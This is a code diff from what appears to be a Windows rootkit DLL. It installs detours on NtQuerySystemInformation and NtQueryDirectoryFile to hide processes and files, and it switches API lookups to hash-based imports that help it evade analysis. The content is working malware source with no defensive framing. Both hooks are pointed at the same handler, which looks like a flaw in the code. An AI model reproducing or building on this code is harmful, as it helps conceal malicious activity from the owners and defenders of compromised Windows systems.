@@ -51,10 +51,10 @@ namespace rkc {
 			break;
 
 		default:
-			return -1;
+			return S_CREATE(SS_WARNING, SF_ROOTKIT, SC_UNHANDLED);
 		}
 
-		return 0;
+		return SUCCESS;
 	#undef RKCTLC
 	}
 
@@ -139,35 +139,37 @@ extern "C" __declspec(dllexport) long __stdcall DbgSetupForLoadLib(
 	GetExitCodeThread(h[1], &ThreadExitCode);
 	CloseHandle(h[1]);
 	if (ThreadExitCode != STILL_ACTIVE)
-		return M_CREATE(S_ERROR, F_ROOTKIT, C_THREAD_DIED);
+		return S_CREATE(SS_ERROR, SF_ROOTKIT, SC_THREAD_DIED);
 
-	dt::DetourSyscallStub(&(void*&)hk::NtQuerySystemInformation, hk::NtQuerySystemInformationHook);
-	dt::DetourSyscallStub(&(void*&)hk::NtQueryDirectoryFile, hk::NtQuerySystemInformationHook);
+	dt::DetourFunction(&(void*&)hk::NtQuerySystemInformation, hk::NtQuerySystemInformationHook, 8);
+	dt::DetourFunction(&(void*&)hk::NtQueryDirectoryFile, hk::NtQuerySystemInformationHook, 8);
 
 	return true;
 }
 
 BOOL __stdcall DllMain(
-	_In_ HINSTANCE hinstDLL,
-	_In_ dword     fdwReason,
-	_In_ void*     pvReserved
+	_In_ HMODULE hinstDLL,
+	_In_ dword   fdwReason,
+	_In_ void*   pvReserved
 ) {
 	UNREFERENCED_PARAMETER(pvReserved);
 
 	switch (fdwReason) {
 	case DLL_PROCESS_ATTACH:
-		// Prepare Vectors for Operation
-		g_ProcessList = new vec::AnyVector;
-		g_FileList = new vec::AnyVector;
+		{
+			// Prepare Vectors for Operation
+			g_ProcessList = new vec::AnyVector;
+			g_FileList = new vec::AnyVector;
 
-		// Get Function Addresses to Hook
-		hk::NtQuerySystemInformation = (m_NtDll::NtQuerySystemInformation_t)
-			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
-		hk::NtQueryDirectoryFile = (m_NtDll::NtQueryDirectoryFile_t)
-			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryFile");
+			// Get Function Addresses to Hook
+			auto K32 = utl::GetModuleHandleByHash(N_NTDLL);
+			hk::NtQuerySystemInformation = (nt::NtQuerySystemInformation_t)
+				utl::ImportFunctionByHash(K32, N_NTQUERYSI);
+			hk::NtQueryDirectoryFile = (nt::NtQueryDirectoryFile_t)
+				utl::ImportFunctionByHash(K32, N_NTQUERYDF);
 
-		return true;
-
+			return true;
+		}
 	case DLL_PROCESS_DETACH:
 		// Clean Vectors
 		delete g_ProcessList;
